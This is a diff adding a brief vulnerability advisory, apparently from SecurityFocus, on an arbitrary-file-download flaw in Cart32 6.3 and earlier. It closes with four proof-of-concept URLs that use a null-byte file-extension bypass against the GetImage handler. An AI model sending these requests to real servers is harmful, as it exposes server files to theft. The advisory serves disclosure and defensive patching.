@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/25928/info
+
+Cart32 is prone to an arbitrary-file-download vulnerability because the application fails to sufficiently sanitize user-supplied input.
+
+An attacker can exploit this issue to download arbitrary files within the context of the webserver process. Information obtained may aid in further attacks.
+
+This issue affects Cart32 6.3; prior versions are also vulnerable. 
+
+http://www.example.com/scripts/c32web.exe/GetImage?ImageName=somefile.txt%00.gif
+http://www.example.com/scripts/c32web.exe/GetImage?ImageName=somefile.txt%00.jpg
+http://www.example.com/scripts/c32web.exe/GetImage?ImageName=somefile.txt%00.pdf
+http://www.example.com/scripts/c32web.exe/GetImage?ImageName=somefile.txt%00.png 
